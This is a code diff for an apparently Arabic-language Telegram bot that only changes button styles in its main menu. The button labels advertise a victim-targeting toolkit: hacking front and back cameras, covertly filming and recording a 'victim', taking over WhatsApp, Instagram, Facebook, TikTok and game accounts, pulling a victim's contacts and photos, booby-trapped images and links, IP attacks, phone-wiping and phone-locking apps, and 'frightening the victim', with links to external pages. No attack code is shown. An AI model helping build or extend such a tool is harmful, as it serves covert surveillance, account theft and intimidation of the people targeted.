@@ -847,144 +847,144 @@ LINKS_INFO = {
 # الأزرار الرئيسية
 BUTTONS = [
     [
-        InlineKeyboardButton("اخـ^_^ـراق كاميرا خلفية", callback_data="btn2", api_kwargs={"style": "danger"}), 
-        InlineKeyboardButton("اخـ^_^ـراق كاميرا امامية", callback_data="btn1")
+        InlineKeyboardButton("اخـ^_^ـراق كاميرا خلفية", callback_data="btn2", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("اخـ^_^ـراق كاميرا امامية", callback_data="btn1", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("تصوير الضੂحيه فيديو", callback_data="btn4"),
-        InlineKeyboardButton("تسجيل صوت الضੂحيه", callback_data="btn3")
+        InlineKeyboardButton("تصوير الضੂحيه فيديو", callback_data="btn4", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("تسجيل صوت الضੂحيه", callback_data="btn3", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق ꫂاتـسـٖ͜ـاب", callback_data="btn6"),
-        InlineKeyboardButton("اخـ^_^ـراق انـس̸ـ꯭ـتـا", callback_data="btn5")
+        InlineKeyboardButton("اخـ^_^ـراق ꫂاتـسـٖ͜ـاب", callback_data="btn6", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("اخـ^_^ـراق انـس̸ـ꯭ـتـا", callback_data="btn5", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق W i F i", callback_data="btn_wifi"),
-        InlineKeyboardButton("اخـ^_^ـراق ببــﭻـﯥ", callback_data="btn7")
+        InlineKeyboardButton("اخـ^_^ـراق W i F i", callback_data="btn_wifi", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("اخـ^_^ـراق ببــﭻـﯥ", callback_data="btn7", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق فري فاير", callback_data="btn8"),
-        InlineKeyboardButton("اخـ^_^ـراق سـنـاب شـﺂت", callback_data="btn10")
+        InlineKeyboardButton("اخـ^_^ـراق فري فاير", callback_data="btn8", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("اخـ^_^ـراق سـنـاب شـﺂت", callback_data="btn10", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق قنوات تلفزيون", callback_data="tv_hack")
+        InlineKeyboardButton("اخـ^_^ـراق قنوات تلفزيون", callback_data="tv_hack", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق يــوتـيـوب", callback_data="btn20")
+        InlineKeyboardButton("اخـ^_^ـراق يــوتـيـوب", callback_data="btn20", api_kwargs={"style": "danger"})
     ], 
     [
-        InlineKeyboardButton("اخـ^_^ـراق فـيـسـبـوك", callback_data="btn9"),
-        InlineKeyboardButton("اخـ^_^ـراق تـيـك تــوك", callback_data="btn11")
+        InlineKeyboardButton("اخـ^_^ـراق فـيـسـبـوك", callback_data="btn9", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("اخـ^_^ـراق تـيـك تــوك", callback_data="btn11", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق بـال بـاي", callback_data="btn16"),
-        InlineKeyboardButton("اخـ^_^ـراق كـواي", callback_data="btn17")
+        InlineKeyboardButton("اخـ^_^ـراق بـال بـاي", callback_data="btn16", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("اخـ^_^ـراق كـواي", callback_data="btn17", api_kwargs={"style": "danger"})
     ], 
     [
-        InlineKeyboardButton("اخـ^_^ـراق تــويــتــر", callback_data="btn160"),
-        InlineKeyboardButton("اخـ^_^ـراق نـيـتـفـلكـس", callback_data="btn19")
+        InlineKeyboardButton("اخـ^_^ـراق تــويــتــر", callback_data="btn160", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("اخـ^_^ـراق نـيـتـفـلكـس", callback_data="btn19", api_kwargs={"style": "danger"})
     ], 
     [
-        InlineKeyboardButton("هجوم علي IP الجهاز", callback_data="ip_attack"),
-        InlineKeyboardButton("جمع معلومات الجهاز", callback_data="btn12")
+        InlineKeyboardButton("هجوم علي IP الجهاز", callback_data="ip_attack", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("جمع معلومات الجهاز", callback_data="btn12", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("تطبيقات فرمتة الهاتف ", callback_data="fire_apps_menu")
+        InlineKeyboardButton("تطبيقات فرمتة الهاتف ", callback_data="fire_apps_menu", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("سحب جهات الاتصال", callback_data="btn_contacts")
+        InlineKeyboardButton("سحب جهات الاتصال", callback_data="btn_contacts", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("لعبة 🅧🅞 ", callback_data="xo_game_menu"), 
-        InlineKeyboardButton("ثــيـمـات تيلـجـرام", callback_data="themt")
+        InlineKeyboardButton("لعبة 🅧🅞 ", callback_data="xo_game_menu", api_kwargs={"style": "success"}), 
+        InlineKeyboardButton("ثــيـمـات تيلـجـرام", callback_data="themt", api_kwargs={"style": "success"})
     ],
     [
-        InlineKeyboardButton("غـبـاء اصطـناعـي", web_app=WebAppInfo(url="https://chatgpt.com/")),
-        InlineKeyboardButton("إختبار الانترنت",  web_app=WebAppInfo(url="https://fast.com/ar/"))
+        InlineKeyboardButton("غـبـاء اصطـناعـي", web_app=WebAppInfo(url="https://chatgpt.com/"), api_kwargs={"style": "success"}),
+        InlineKeyboardButton("إختبار الانترنت",  web_app=WebAppInfo(url="https://fast.com/ar/"), api_kwargs={"style": "success"})
     ],
     [
-        InlineKeyboardButton("معلومات دقيقه جدااا", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/ip-check/"))
+        InlineKeyboardButton("معلومات دقيقه جدااا", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/ip-check/"), api_kwargs={"style": "danger"})
     ], 
     [
-        InlineKeyboardButton("فك حظر ꫂاتـسـٖ͜ـاب", callback_data="whatsapp_unban"),
-        InlineKeyboardButton("حظر انـس̸ـ꯭ـتـا", callback_data="instagram_ban")
+        InlineKeyboardButton("فك حظر ꫂاتـسـٖ͜ـاب", callback_data="whatsapp_unban", api_kwargs={"style": "primary"}),
+        InlineKeyboardButton("حظر انـس̸ـ꯭ـتـا", callback_data="instagram_ban", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("تبنيد بث تـيـك تــوك", callback_data="tiktok_report"),
+        InlineKeyboardButton("تبنيد بث تـيـك تــوك", callback_data="tiktok_report", api_kwargs={"style": "danger"}),
     ],
     [
-        InlineKeyboardButton("تـلـغـ/~/ــيــم روابط ", callback_data="btn13"),
-        InlineKeyboardButton("زخرفة الاسماء", callback_data="btn14")
+        InlineKeyboardButton("تـلـغـ/~/ــيــم روابط ", callback_data="btn13", api_kwargs={"style": "primary"}),
+        InlineKeyboardButton("زخرفة الاسماء", callback_data="btn14", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق الهاتف كاملاً", callback_data="contact_developer_full_hack")
+        InlineKeyboardButton("اخـ^_^ـراق الهاتف كاملاً", callback_data="contact_developer_full_hack", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("سحب صور الضੂحيه", callback_data="btn15"),
-        InlineKeyboardButton("فحص الروابط", callback_data="check_link")
+        InlineKeyboardButton("سحب صور الضੂحيه", callback_data="btn15", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("فحص الروابط", callback_data="check_link", api_kwargs={"style": "success"})
     ],
     [
-        InlineKeyboardButton("قراءة الباركود", web_app=WebAppInfo(url="https://products.aspose.app/barcode/ar/recognize"))
+        InlineKeyboardButton("قراءة الباركود", web_app=WebAppInfo(url="https://products.aspose.app/barcode/ar/recognize"), api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("تتبع الـIP", callback_data="btn18")
+        InlineKeyboardButton("تتبع الـIP", callback_data="btn18", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("ارقام وهمية", callback_data="virtual_numbers"),
-        InlineKeyboardButton("بريد موقت", callback_data="temp_email_btn")
+        InlineKeyboardButton("ارقام وهمية", callback_data="virtual_numbers", api_kwargs={"style": "primary"}),
+        InlineKeyboardButton("بريد موقت", callback_data="temp_email_btn", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("الـID الخاص بك", callback_data="get_my_id"), 
+        InlineKeyboardButton("الـID الخاص بك", callback_data="get_my_id", api_kwargs={"style": "success"}), 
     ], 
     [
-        InlineKeyboardButton("تحويل النص لصوت", callback_data="tts_service"),
-        InlineKeyboardButton("خـدمـات ويـب هــــوك", callback_data="webhook_services")
+        InlineKeyboardButton("تحويل النص لصوت", callback_data="tts_service", api_kwargs={"style": "primary"}),
+        InlineKeyboardButton("خـدمـات ويـب هــــوك", callback_data="webhook_services", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("معلومات دقيقه جدااا ②", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/ip.-ff"))
+        InlineKeyboardButton("معلومات دقيقه جدااا ②", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/ip.-ff"), api_kwargs={"style": "danger"})
     ], 
     [
-        InlineKeyboardButton("إتصال وهمي", callback_data="telz_call"), 
-        InlineKeyboardButton("معرفة مستخدم", callback_data="get_user_info")
+        InlineKeyboardButton("إتصال وهمي", callback_data="telz_call", api_kwargs={"style": "primary"}), 
+        InlineKeyboardButton("معرفة مستخدم", callback_data="get_user_info", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("تخويف الضੂحيه", callback_data="btn_ttt")
+        InlineKeyboardButton("تخويف الضੂحيه", callback_data="btn_ttt", api_kwargs={"style": "success"})
     ],
     [
-        InlineKeyboardButton("اختصار الروابط", callback_data="shorten_link"), 
-        InlineKeyboardButton("الـد|رك ويب", callback_data="Dark_web")
+        InlineKeyboardButton("اختصار الروابط", callback_data="shorten_link", api_kwargs={"style": "primary"}), 
+        InlineKeyboardButton("الـد|رك ويب", callback_data="Dark_web", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("قفل الهاتف برمز", callback_data="phone_lock_app")
+        InlineKeyboardButton("قفل الهاتف برمز", callback_data="phone_lock_app", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("تـلـغـ/~/ــيــم الصور", callback_data="booby_image"),
-        InlineKeyboardButton("إغلاق مواقع", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/hogom3/"))
+        InlineKeyboardButton("تـلـغـ/~/ــيــم الصور", callback_data="booby_image", api_kwargs={"style": "danger"}),
+        InlineKeyboardButton("إغلاق مواقع", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/hogom3/"), api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("سـحـب مـلـفـات الـمـواقـع", callback_data="btn_download_site"),
+        InlineKeyboardButton("سـحـب مـلـفـات الـمـواقـع", callback_data="btn_download_site", api_kwargs={"style": "danger"}),
     ], 
     [
-        InlineKeyboardButton("تحميل فيديوهات من جميع المنصات", callback_data="dl_video")
+        InlineKeyboardButton("تحميل فيديوهات من جميع المنصات", callback_data="dl_video", api_kwargs={"style": "primary"})
     ], 
     [
-        InlineKeyboardButton("تقييم البوت", callback_data="rate_bot"),
-        InlineKeyboardButton("رسالة للمالك", callback_data="contact_developer_message")
+        InlineKeyboardButton("تقييم البوت", callback_data="rate_bot", api_kwargs={"style": "success"}),
+        InlineKeyboardButton("رسالة للمالك", callback_data="contact_developer_message", api_kwargs={"style": "success"})
     ],
     [
-        InlineKeyboardButton("گــــيـــب حــمــزهـ", callback_data="keyboard_hamza")
+        InlineKeyboardButton("گــــيـــب حــمــزهـ", callback_data="keyboard_hamza", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("تطبيق المجال", callback_data="app_hamza")
+        InlineKeyboardButton("تطبيق المجال", callback_data="app_hamza", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("الــخــلاصــه", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/HAMZA/"))
+        InlineKeyboardButton("الــخــلاصــه", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/HAMZA/"), api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("لـــوحــــة تــــحـــــكــــم الـــمـــالــــــك 👑", callback_data="owner_panel")
+        InlineKeyboardButton("لـــوحــــة تــــحـــــكــــم الـــمـــالــــــك 👑", callback_data="owner_panel", api_kwargs={"style": "danger"})
     ],
     [
-        InlineKeyboardButton("✧ الــمــالــك  -  𝐇𝐀𝐌𝐙𝐀 ✧", url="tg://user?id=7305720183")
+        InlineKeyboardButton("✧ الــمــالــك  -  𝐇𝐀𝐌𝐙𝐀 ✧", url="tg://user?id=7305720183", api_kwargs={"style": "primary"})
     ]
 ]
 LINKS = {
